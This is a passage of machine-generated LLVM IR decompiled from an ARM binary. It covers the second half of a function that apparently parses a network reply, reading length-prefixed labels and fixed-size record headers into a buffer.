  br i1 %v2_16700, label %dec_label_pc_16708, label %dec_label_pc_16a2c

dec_label_pc_16708:                               ; preds = %dec_label_pc_16700
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp214, label %dec_label_pc_16720, label %dec_label_pc_16730

dec_label_pc_16720:                               ; preds = %dec_label_pc_16708
  %v0_16720 = call i32 @function_12ba4()
  br label %dec_label_pc_16728

dec_label_pc_16728:                               ; preds = %dec_label_pc_166f4, %dec_label_pc_16720
  %storemerge2 = phi i32 [ %v0_16720, %dec_label_pc_16720 ], [ %v0_166f4, %dec_label_pc_166f4 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_16720 ], [ 1, %dec_label_pc_166f4 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_16728 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_16728, align 4
  br label %dec_label_pc_16a74

dec_label_pc_16730:                               ; preds = %dec_label_pc_16708
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_16734.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @ip, align 4
  %v2_16734 = add i32 %v0_16734.pre, 12
  store i32 %v2_16734, i32* @r4, align 4
  %v3_16734 = icmp ugt i32 %v0_16734.pre, -13
  store i1 %v3_16734, i1* %cpsr_c.global-to-local, align 1
  %v9_16734 = icmp eq i32 %v2_16734, 0
  br i1 %v9_16734, label %dec_label_pc_16a2c, label %dec_label_pc_1673c

dec_label_pc_1673c:                               ; preds = %dec_label_pc_16730
  %v2_16740 = add i32 %v4_16664, -12
  store i32 %v2_16740, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp223 = icmp slt i32 %v2_16740, 1
  br i1 %tmp223, label %dec_label_pc_16a2c, label %dec_label_pc_16750

dec_label_pc_16748thread-pre-split:               ; preds = %dec_label_pc_1676c
  %v2_1677815 = add i32 %v2_1675c, -1
  store i32 %v2_1677815, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_1677815, 1
  br i1 %tmp224, label %dec_label_pc_16a2c, label %dec_label_pc_16750

dec_label_pc_16750:                               ; preds = %dec_label_pc_1673c, %dec_label_pc_16748thread-pre-split
  %v1_16774 = phi i32 [ %v2_1677815, %dec_label_pc_16748thread-pre-split ], [ %v2_16740, %dec_label_pc_1673c ]
  %v0_16750 = phi i32 [ %v2_16764, %dec_label_pc_16748thread-pre-split ], [ %v2_16734, %dec_label_pc_1673c ]
  %v1_16750 = inttoptr i32 %v0_16750 to i8*
  %v2_16750 = load i8, i8* %v1_16750, align 1
  %v3_16750 = zext i8 %v2_16750 to i32
  store i32 %v3_16750, i32* %r3.global-to-local, align 4
  %v5_16750 = add i32 %v0_16750, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16754 = icmp eq i8 %v2_16750, 0
  %v2_1675c = sub i32 %v1_16774, %v3_16750
  store i32 %v2_1675c, i32* @lr, align 4
  %v1_16760 = and i32 %v3_16750, 192
  store i32 %v1_16760, i32* @ip, align 4
  %v2_16764 = add i32 %v3_16750, %v5_16750
  br i1 %v2_16754, label %dec_label_pc_16780, label %dec_label_pc_1676c

dec_label_pc_1676c:                               ; preds = %dec_label_pc_16750
  %v2_1676c = icmp eq i32 %v1_16760, 192
  store i1 %v2_1676c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1676c, label %.thread9, label %dec_label_pc_16748thread-pre-split

.thread9:                                         ; preds = %dec_label_pc_1676c
  %v2_16770 = add i32 %v0_16750, 2
  %v2_16774 = add i32 %v1_16774, -2
  store i32 %v2_16774, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16780

dec_label_pc_16780:                               ; preds = %dec_label_pc_16750, %.thread9
  %v1_1678c = phi i32 [ %v2_16770, %.thread9 ], [ %v5_16750, %dec_label_pc_16750 ]
  %v0_16780 = phi i32 [ %v2_16774, %.thread9 ], [ %v1_16774, %dec_label_pc_16750 ]
  %v1_16780 = add i32 %v0_16780, -3
  %v2_16780 = icmp ugt i32 %v0_16780, 2
  store i1 %v2_16780, i1* %cpsr_c.global-to-local, align 1
  %v3_16780 = sub i32 2, %v0_16780
  %v4_16780 = and i32 %v3_16780, %v0_16780
  %v5_16780 = icmp slt i32 %v4_16780, 0
  %v6_16780 = icmp slt i32 %v1_16780, 0
  %v7_16780 = icmp eq i32 %v0_16780, 3
  %v3_16784 = xor i1 %v6_16780, %v5_16780
  %v4_16784 = or i1 %v7_16780, %v3_16784
  br i1 %v4_16784, label %dec_label_pc_16a2c, label %dec_label_pc_16788

dec_label_pc_16788:                               ; preds = %dec_label_pc_16780
  %v1_16788 = sub i32 -8, %v0_16734.pre
  %v2_1678c = add i32 %v1_1678c, %v1_16788
  store i32 %v2_1678c, i32* %r3.global-to-local, align 4
  %v3_1678c = icmp ult i32 %v2_1678c, %v1_16788
  store i1 %v3_1678c, i1* %cpsr_c.global-to-local, align 1
  %v8_1678c = icmp slt i32 %v2_1678c, 0
  br i1 %v8_1678c, label %dec_label_pc_16a2c, label %dec_label_pc_167b0

dec_label_pc_167b0:                               ; preds = %dec_label_pc_16788
  %v2_16798 = add i32 %v2_1678c, 12
  store i32 %v2_16798, i32* %r1.global-to-local, align 4
  store i32 %v2_167b8, i32* @r5, align 4
  store i32 %v2_167bc, i32* @r7, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_16a0056, label %dec_label_pc_167d4, label %dec_label_pc_16a04

dec_label_pc_167d4:                               ; preds = %dec_label_pc_167b0, %dec_label_pc_169dc.dec_label_pc_167d4_crit_edge
  %v0_167d8 = phi i32 [ %v0_167d8.pre, %dec_label_pc_169dc.dec_label_pc_167d4_crit_edge ], [ %v0_16734.pre, %dec_label_pc_167b0 ]
  %stack_var_-460.364 = phi i32 [ %v2_169e4, %dec_label_pc_169dc.dec_label_pc_167d4_crit_edge ], [ %v2_16798, %dec_label_pc_167b0 ]
  %stack_var_-452.061 = phi i32 [ %v1_169e8, %dec_label_pc_169dc.dec_label_pc_167d4_crit_edge ], [ 0, %dec_label_pc_167b0 ]
  %stack_var_-480.260 = phi i32 [ %stack_var_-480.1, %dec_label_pc_169dc.dec_label_pc_167d4_crit_edge ], [ 1, %dec_label_pc_167b0 ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-460.364, i32* @r1, align 4
  store i32 %v2_167b8, i32* %r3.global-to-local, align 4
  %v5_167ec = call i32 @function_16200(i32 %v0_167d8, i32 %stack_var_-460.364, i32 %v4_16664, i32 %v2_167b8, i32 256)
  store i32 %v5_167ec, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_167f0 = icmp slt i32 %v5_167ec, 0
  br i1 %v1_167f0, label %dec_label_pc_168c0, label %dec_label_pc_167f8

dec_label_pc_167f8:                               ; preds = %dec_label_pc_167d4
  store i32 %stack_var_-460.364, i32* %r1.global-to-local, align 4
  %v1_16800 = add i32 %v5_167ec, 10
  store i32 %v1_16800, i32* @sb, align 4
  %v2_16804 = sub i32 %v4_16664, %stack_var_-460.364
  %v2_16808 = sub i32 %v2_16804, %v1_16800
  store i32 %v2_16808, i32* %r3.global-to-local, align 4
  %v3_16808 = icmp uge i32 %v2_16804, %v1_16800
  store i1 %v3_16808, i1* %cpsr_c.global-to-local, align 1
  %v8_16808 = icmp slt i32 %v2_16808, 0
  br i1 %v8_16808, label %dec_label_pc_168b8.thread, label %dec_label_pc_16818

dec_label_pc_168b8.thread:                        ; preds = %dec_label_pc_167f8
  store i32 %v2_16808, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_168c0

dec_label_pc_16818:                               ; preds = %dec_label_pc_167f8
  %v1_1681c = call i32 @function_f7d0(i32 %v2_167b8)
  %v0_16824 = load i32, i32* @r4, align 4
  %v2_16824 = add i32 %v0_16824, %stack_var_-460.364
  %v0_16828 = load i32, i32* @sl, align 4
  %v2_16828 = add i32 %v0_16828, %v2_16824
  store i32 %v2_16828, i32* %r1.global-to-local, align 4
  %v1_1682c = add i32 %v2_16828, 2
  store i32 %v1_1682c, i32* %ip.global-to-local, align 4
  %v1_16830 = add i32 %v2_16828, 4
  store i32 %v1_16830, i32* %r3.global-to-local, align 4
  %v1_16834 = add i32 %v2_16828, 5
  %v2_16834 = inttoptr i32 %v1_16834 to i8*
  %v3_16834 = load i8, i8* %v2_16834, align 1
  %v4_16834 = zext i8 %v3_16834 to i32
  %v1_1683c = add i32 %v2_16828, 8
  %v2_1683c = inttoptr i32 %v1_1683c to i8*
  %v3_1683c = load i8, i8* %v2_1683c, align 1
  %v4_1683c = zext i8 %v3_1683c to i32
  %v1_16848 = add i32 %v2_16828, 6
  %v2_16848 = inttoptr i32 %v1_16848 to i8*
  %v3_16848 = load i8, i8* %v2_16848, align 1
  %v4_16848 = zext i8 %v3_16848 to i32
  store i32 %v4_16848, i32* %r3.global-to-local, align 4
  %v1_1684c = add i32 %v2_16828, 9
  %v2_1684c = inttoptr i32 %v1_1684c to i8*
  %v3_1684c = load i8, i8* %v2_1684c, align 1
  %v4_1684c = zext i8 %v3_1684c to i32
  %v3_16854 = inttoptr i32 %v2_16828 to i8*
  %v4_16854 = load i8, i8* %v3_16854, align 1
  %v6_16854 = zext i8 %v4_16854 to i32
  %v1_16858 = add i32 %v2_16828, 3
  %v2_16858 = inttoptr i32 %v1_16858 to i8*
  %v3_16858 = load i8, i8* %v2_16858, align 1
  %v4_16858 = zext i8 %v3_16858 to i32
  store i32 %v4_16858, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v2_16860 = inttoptr i32 %v1_1682c to i8*
  %v3_16860 = load i8, i8* %v2_16860, align 1
  %v4_16860 = zext i8 %v3_16860 to i32
  store i32 %v4_16860, i32* %ip.global-to-local, align 4
  %v1_16864 = add i32 %v2_16828, 1
  %v2_16864 = inttoptr i32 %v1_16864 to i8*
  %v3_16864 = load i8, i8* %v2_16864, align 1
  %v4_16864 = zext i8 %v3_16864 to i32
  %v4_16868 = mul nuw nsw i32 %v4_1683c, 256
  %v5_16868 = or i32 %v4_1684c, %v4_16868
  store i32 %v5_16868, i32* @r6, align 4
  store i32 %v4_16834, i32* @r7, align 4
  %v4_16870 = mul nuw nsw i32 %v6_16854, 256
  %v5_16870 = or i32 %v4_16864, %v4_16870
  store i32 %v5_16870, i32* @lr, align 4
  %v4_16874 = mul nuw nsw i32 %v4_16860, 256
  %v5_16874 = or i32 %v4_16874, %v4_16858
  store i32 %v5_16874, i32* %r3.global-to-local, align 4
  store i32 %v2_16808, i32* @r5, align 4
  store i32 %v4_16848, i32* @ip, align 4
  %v1_16888 = add i32 %v2_16828, 10
  store i32 %v1_16888, i32* %r1.global-to-local, align 4
  %v1_1688c = add i32 %v2_16824, 10
  store i32 %v1_1688c, i32* @r4, align 4
  %v2_16890 = sub i32 %v2_16808, %v5_16868
  %v3_16890 = icmp uge i32 %v2_16808, %v5_16868
  store i1 %v3_16890, i1* %cpsr_c.global-to-local, align 1
  %tmp226 = sub i32 0, %v2_16890
  %v6_16890 = and i32 %v2_16808, %tmp226
  %v7_16890 = icmp slt i32 %v6_16890, 0
  %v8_16890 = icmp slt i32 %v2_16890, 0
  store i32 %v1_1681c, i32* %stack_var_-144, align 4
  %v2_168b0 = xor i1 %v8_16890, %v7_16890
  br i1 %v2_168b0, label %dec_label_pc_168c0, label %dec_label_pc_168b8

dec_label_pc_168b8:                               ; preds = %dec_label_pc_16818
  %v0_168b4 = load i32, i32* @sb, align 4
  %v2_168b4 = add i32 %v0_168b4, %v5_16868
  store i32 %v2_168b4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_168b8 = icmp slt i32 %v2_168b4, 0
  br i1 %v1_168b8, label %dec_label_pc_168c0, label %dec_label_pc_168dc

dec_label_pc_168c0:                               ; preds = %dec_label_pc_168b8, %dec_label_pc_16818, %dec_label_pc_167d4, %dec_label_pc_168b8.thread
  store i32 %stack_var_-452.061, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168c4 = icmp eq i32 %stack_var_-452.061, 0
  br i1 %v2_168c4, label %dec_label_pc_16a2c, label %dec_label_pc_168cc

dec_label_pc_168cc:                               ; preds = %dec_label_pc_168c0
  store i32 %tmp144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_168d0, label %dec_label_pc_16a2c, label %dec_label_pc_16a04

dec_label_pc_168dc:                               ; preds = %dec_label_pc_168b8
  store i32 %stack_var_-480.260, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168e0 = icmp eq i32 %stack_var_-480.260, 0
  br i1 %v2_168e0, label %dec_label_pc_16984, label %dec_label_pc_168e8

dec_label_pc_168e8:                               ; preds = %dec_label_pc_168dc
  %v0_168e8 = load i32, i32* @fp, align 4
  %v1_168e8 = add i32 %v0_168e8, 28
  store i32 %v1_168e8, i32* %r3.global-to-local, align 4
  %v1_168ec = inttoptr i32 %v1_168e8 to i32*
  %v2_168ec = load i32, i32* %v1_168ec, align 4
  store i32 %v2_168ec, i32* @r3, align 4
  %v3_168ec = add i32 %v0_168e8, 32
  %v4_168ec = inttoptr i32 %v3_168ec to i32*
  %v5_168ec = load i32, i32* %v4_168ec, align 4
  store i32 %v5_168ec, i32* @ip, align 4
  %v6_168ec = add i32 %v0_168e8, 36
  %v7_168ec = inttoptr i32 %v6_168ec to i32*
  %v8_168ec = load i32, i32* %v7_168ec, align 4
  store i32 %v8_168ec, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_168e8, i32* @r0, align 4
  store i32 %v2_167bc, i32* @r1, align 4
  %v0_16908 = call i32 @function_f350()
  %v0_1690c = load i32, i32* @fp, align 4
  %v1_1690c = add i32 %v0_1690c, 4
  %v2_1690c = inttoptr i32 %v1_1690c to i32*
  %v3_1690c = load i32, i32* %v2_1690c, align 4
  %v2_16910 = icmp ugt i32 %v3_1690c, 23
  store i1 %v2_16910, i1* %cpsr_c.global-to-local, align 1
  %v7_16910 = icmp eq i32 %v3_1690c, 24
  br i1 %v7_16910, label %dec_label_pc_16934, label %dec_label_pc_16918

dec_label_pc_16918:                               ; preds = %dec_label_pc_168e8
  %v1_16918 = add i32 %v0_1690c, 28
  %v2_16918 = inttoptr i32 %v1_16918 to i32*
  %v3_16918 = load i32, i32* %v2_16918, align 4
  store i32 %v3_16918, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1691c = icmp eq i32 %v3_16918, 0
  br i1 %v2_1691c, label %dec_label_pc_16a04, label %dec_label_pc_16924

dec_label_pc_16924:                               ; preds = %dec_label_pc_16918
  store i1 %v2_16928, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_16928, label %dec_label_pc_16934, label %bb227

bb227:                                            ; preds = %dec_label_pc_16924
  store i1 %v3_1692c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_1692c, label %dec_label_pc_16934, label %dec_label_pc_16a04

dec_label_pc_16934:                               ; preds = %dec_label_pc_16924, %bb227, %dec_label_pc_168e8
  store i32 %v0_1630c, i32* %r1.global-to-local, align 4
  %v3_16938 = icmp uge i32 %v3_1690c, %v0_1630c
  store i1 %v3_16938, i1* %cpsr_c.global-to-local, align 1
  %v9_16938 = icmp eq i32 %v3_1690c, %v0_1630c
  br i1 %v9_16938, label %dec_label_pc_16948, label %bb228

bb228:                                            ; preds = %dec_label_pc_16934
  br label %dec_label_pc_169dc

dec_label_pc_16948:                               ; preds = %dec_label_pc_16934
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.061, i32* @r5, align 4
  %v1_16950 = add i32 %v0_1690c, 16
  %v2_16950 = inttoptr i32 %v1_16950 to i32*
  %v3_16950 = load i32, i32* %v2_16950, align 4
  %v2_16954 = sub i32 %tmp159, %stack_var_-452.061
  %v1_16958 = add i32 %v2_16954, -1
  store i32 %v1_16958, i32* %r3.global-to-local, align 4
  %v1_1695c = add i32 %v3_16950, 4
  %v2_16960 = mul i32 %v1_1695c, %v1_16958
  store i32 %v2_16960, i32* %r1.global-to-local, align 4
  %v1_16964 = add i32 %v0_1690c, 32
  %v2_16964 = inttoptr i32 %v1_16964 to i32*
  %v3_16964 = load i32, i32* %v2_16964, align 4
  %v3_16968 = icmp uge i32 %v2_16960, %v3_16964
  store i1 %v3_16968, i1* %cpsr_c.global-to-local, align 1
  %v2_1696c = add i32 %v0_1690c, 36
  %v3_1696c = inttoptr i32 %v2_1696c to i32*
  store i32 %v1_16958, i32* %v3_1696c, align 4
  %tmp286 = icmp ugt i32 %v2_16960, %v3_16964
  br i1 %tmp286, label %dec_label_pc_16a04, label %dec_label_pc_16974

dec_label_pc_16974:                               ; preds = %dec_label_pc_16948
  store i32 0, i32* @r7, align 4
  %v1_1697c = load i32, i32* @fp, align 4
  %v2_1697c = add i32 %v1_1697c, 36
  %v3_1697c = inttoptr i32 %v2_1697c to i32*
  store i32 0, i32* %v3_1697c, align 4
  br label %dec_label_pc_169dc

dec_label_pc_16984:                               ; preds = %dec_label_pc_168dc
  store i32 %v1_1681c, i32* @r0, align 4
  %v0_16988 = call i32 @function_108e4()
  store i32 %v5_16870, i32* %r3.global-to-local, align 4
  store i32 %v0_1630c, i32* @ip, align 4
  %v3_16994 = icmp uge i32 %v5_16870, %v0_1630c
  store i1 %v3_16994, i1* %cpsr_c.global-to-local, align 1
  %v9_16994 = icmp eq i32 %v5_16870, %v0_1630c
  br i1 %v9_16994, label %dec_label_pc_1699c, label %dec_label_pc_169dc

dec_label_pc_1699c:                               ; preds = %dec_label_pc_16984
  %v0_1699c = load i32, i32* @fp, align 4
  %v1_1699c = add i32 %v0_1699c, 16
  %v2_1699c = inttoptr i32 %v1_1699c to i32*
  %v3_1699c = load i32, i32* %v2_1699c, align 4
  store i32 %v3_1699c, i32* %r1.global-to-local, align 4
  store i32 %v5_16868, i32* %r3.global-to-local, align 4
  %v3_169a4 = icmp uge i32 %v3_1699c, %v5_16868
  store i1 %v3_169a4, i1* %cpsr_c.global-to-local, align 1
  %v9_169a4 = icmp eq i32 %v3_1699c, %v5_16868
  br i1 %v9_169a4, label %dec_label_pc_169b8, label %dec_label_pc_169ac

dec_label_pc_169ac:                               ; preds = %dec_label_pc_1699c
  %v1_169ac = inttoptr i32 %v0_1699c to i32*
  %v2_169ac = load i32, i32* %v1_169ac, align 4
  store i32 %v2_169ac, i32* @r0, align 4
  %v0_169b0 = call i32 @function_108e4()
  br label %dec_label_pc_16a2c

dec_label_pc_169b8:                               ; preds = %dec_label_pc_1699c
  %v1_169b8 = add i32 %v0_1699c, 36
  %v2_169b8 = inttoptr i32 %v1_169b8 to i32*
  %v3_169b8 = load i32, i32* %v2_169b8, align 4
  %v1_169bc = add i32 %v0_1699c, 28
  %v2_169bc = inttoptr i32 %v1_169bc to i32*
  %v3_169bc = load i32, i32* %v2_169bc, align 4
  store i32 %v3_169bc, i32* @r3, align 4
  %v3_169c0 = mul i32 %v3_169b8, %v5_16868
  %v4_169c0 = add i32 %v3_169bc, %v3_169c0
  store i32 %v4_169c0, i32* @r0, align 4
  store i32 %v5_16868, i32* @r2, align 4
  store i32 %v1_16888, i32* @r1, align 4
  %v0_169cc = call i32 @function_f350()
  %v0_169d0 = load i32, i32* @fp, align 4
  %v1_169d0 = add i32 %v0_169d0, 36
  %v2_169d0 = inttoptr i32 %v1_169d0 to i32*
  %v3_169d0 = load i32, i32* %v2_169d0, align 4
  %v1_169d4 = add i32 %v3_169d0, 1
  store i32 %v1_169d4, i32* %r3.global-to-local, align 4
  store i32 %v1_169d4, i32* %v2_169d0, align 4
  br label %dec_label_pc_169dc

dec_label_pc_169dc:                               ; preds = %bb228, %dec_label_pc_16984, %dec_label_pc_16974, %dec_label_pc_169b8
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_169b8 ], [ 0, %dec_label_pc_16984 ], [ 0, %dec_label_pc_16974 ], [ 1, %bb228 ]
  %v1_169e4 = load i32, i32* @r4, align 4
  %v1_169e8 = add nuw nsw i32 %stack_var_-452.061, 1
  store i32 %v1_169e8, i32* %r1.global-to-local, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  %v3_169fc = icmp uge i32 %v1_169e8, %tmp159
  store i1 %v3_169fc, i1* %cpsr_c.global-to-local, align 1
  %v5_16a00 = icmp slt i32 %v1_169e8, %tmp159
  br i1 %v5_16a00, label %dec_label_pc_169dc.dec_label_pc_167d4_crit_edge, label %dec_label_pc_16a04

dec_label_pc_169dc.dec_label_pc_167d4_crit_edge:  ; preds = %dec_label_pc_169dc
  %v2_169e4 = add i32 %v1_169e4, %stack_var_-460.364
  %v0_167d8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_167d4

dec_label_pc_16a04:                               ; preds = %dec_label_pc_168cc, %dec_label_pc_167b0, %dec_label_pc_169dc, %dec_label_pc_16918, %dec_label_pc_16948, %bb227
  %v1_16a08 = call i32 @function_cda4(i32 %v3_165dc)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a10 = icmp eq i32 %arg3, 0
  br i1 %v2_16a10, label %.thread21, label %bb230

bb230:                                            ; preds = %dec_label_pc_16a04
  %v1_16a18 = load i32, i32* @sl, align 4
  %v3_16a14 = inttoptr i32 %arg3 to i32*
  store i32 %v1_16a18, i32* %v3_16a14, align 4
  br label %bb231

.thread21:                                        ; preds = %dec_label_pc_16a04
  br label %bb231

bb231:                                            ; preds = %bb230, %.thread21
  store i32 ptrtoint (i32* @global_var_16a20.664 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_16a10, i32 ptrtoint (i32* @global_var_108e4.259 to i32))
  store i32 %v1_16354, i32* @r0, align 4
  %v0_16a24 = call i32 @function_108e4()
  br label %dec_label_pc_16a94

dec_label_pc_16a2c:                               ; preds = %thread-pre-split, %dec_label_pc_16628, %dec_label_pc_16788, %dec_label_pc_16780, %dec_label_pc_16730, %dec_label_pc_1673c, %dec_label_pc_16748thread-pre-split, %thread-pre-split.thread, %dec_label_pc_16700, %dec_label_pc_168cc, %dec_label_pc_168c0, %dec_label_pc_165ec, %dec_label_pc_165cc, %dec_label_pc_169ac
  %v1_16a30 = add i32 %v0_164f0, 1
  store i32 %v1_16a30, i32* @r5, align 4
  br label %dec_label_pc_16a3c

dec_label_pc_16a3c:                               ; preds = %.thread7, %dec_label_pc_16a2c
  %storemerge22 = phi i32 [ -1, %dec_label_pc_16a2c ], [ %v7_166ec, %.thread7 ]
  %stack_var_-468.2 = phi i32 [ %v1_16a30, %dec_label_pc_16a2c ], [ %v0_164f0, %.thread7 ]
  store i32 %storemerge22, i32* @sb, align 4
  %v1_16a40 = add i32 %stack_var_-476.1, -1
  store i32 %v1_16a40, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_16a40, 1
  br i1 %tmp232, label %dec_label_pc_16a5c, label %dec_label_pc_163f4

dec_label_pc_16a54:                               ; preds = %dec_label_pc_165a0, %bb218, %bb213, %.thread5, %dec_label_pc_16370
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_16a5c

dec_label_pc_16a5c:                               ; preds = %dec_label_pc_16a3c, %.thread132, %dec_label_pc_16a54
  %stack_var_-472.1 = phi i32 [ %v1_16354, %dec_label_pc_16a54 ], [ 0, %.thread132 ], [ %v1_16354, %dec_label_pc_16a3c ]
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_16a54 ], [ -1, %.thread132 ], [ %v3_165dc, %dec_label_pc_16a3c ]
  %v0_16a5c = call i32 @function_12ba4()
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_16a68 = icmp eq i32 %stack_var_-488.2, -1
  store i1 %v2_16a68, i1* %cpsr_c.global-to-local, align 1
  %v7_16a68 = icmp eq i32 %stack_var_-488.2, -1
  %v2_16a6c = inttoptr i32 %v0_16a5c to i32*
  store i32 -1, i32* %v2_16a6c, align 4
  br i1 %v7_16a68, label %dec_label_pc_16a7c, label %dec_label_pc_16a74

dec_label_pc_16a74:                               ; preds = %dec_label_pc_16a5c, %dec_label_pc_16728
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_16a5c ], [ %v1_16354, %dec_label_pc_16728 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_16a5c ], [ %v3_165dc, %dec_label_pc_16728 ]
  %v1_16a78 = call i32 @function_cda4(i32 %stack_var_-488.3)
  br label %dec_label_pc_16a7c

dec_label_pc_16a7c:                               ; preds = %dec_label_pc_16a5c, %dec_label_pc_16a74
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_16a5c ], [ %stack_var_-472.2, %dec_label_pc_16a74 ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_16a80 = call i32 @function_108e4()
  %v0_16a84 = load i32, i32* @sl, align 4
  store i32 %v0_16a84, i32* @r0, align 4
  %v0_16a88 = call i32 @function_108e4()
  br label %dec_label_pc_16a94

dec_label_pc_16a94:                               ; preds = %bb231, %dec_label_pc_16a7c
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_16a7c ], [ %v4_16664, %bb231 ]
  store i32 %v3_162f8, i32* @r4, align 4
  store i32 %v6_162f8, i32* @r5, align 4
  store i32 %v9_162f8, i32* @r6, align 4
  store i32 %v12_162f8, i32* @r7, align 4
  store i32 %v15_162f8, i32* @r8, align 4
  store i32 %v18_162f8, i32* @sb, align 4
  store i32 %v21_162f8, i32* @sl, align 4
  store i32 %v24_162f8, i32* @fp, align 4
  store i32 %v27_162f8, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-488.2, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_16a40, { 1, 2, 0 }
  uselistorder i32 %v1_169e8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1699c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_16958, { 1, 0, 2 }
  uselistorder i32 %v2_16890, { 1, 0 }
  uselistorder i32 %v5_16868, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_16828, { 3, 4, 0, 5, 6, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 %v2_16824, { 1, 0 }
  uselistorder i32 %v2_16808, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_16804, { 1, 0 }
  uselistorder i32 %v1_16800, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.061, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.364, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_16780, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_1675c, { 1, 0 }
  uselistorder i32 %v3_16750, { 0, 2, 1, 3 }
  uselistorder i32 %v0_16750, { 0, 2, 1 }
  uselistorder i32 %v2_16740, { 0, 2, 1 }
  uselistorder i1 %v7_16674, { 1, 0 }
  uselistorder i32 %v1_16674, { 1, 0 }
  uselistorder i32 %v0_16674, { 1, 0 }
  uselistorder i32 %v4_16664, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v3_165dc, { 1, 0, 2, 9, 7, 6, 5, 8, 4, 10, 11, 3 }
  uselistorder i32 %v6_16594, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16520, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_16508, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 %v1_164fc, { 1, 0 }
  uselistorder i32 %v0_164f0, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-464.1, { 1, 0 }
  uselistorder i1 %v7_163f8, { 1, 0 }
  uselistorder i32 %v1_163fc, { 0, 2, 1 }
  uselistorder i32 %stack_var_-468.0, { 0, 2, 1 }
  uselistorder i32 %v2_167b8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_166c8, { 2, 0, 1 }
  uselistorder i32 %v2_16550, { 1, 0, 2 }
  uselistorder i32 %v2_16528, { 1, 0 }
  uselistorder i32 %v0_16370, { 1, 0, 2 }
  uselistorder i32 %v1_16354, { 7, 0, 3, 6, 4, 8, 1, 9, 2, 5, 10, 11 }
  uselistorder i32 %v0_16320, { 5, 1, 3, 2, 4, 0, 6 }
  uselistorder i32 %v0_1630c, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp159, { 3, 8, 7, 0, 6, 2, 4, 1, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 20, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 2, 21, 22, 52, 1, 23, 24, 25, 26, 27, 28, 29, 13, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
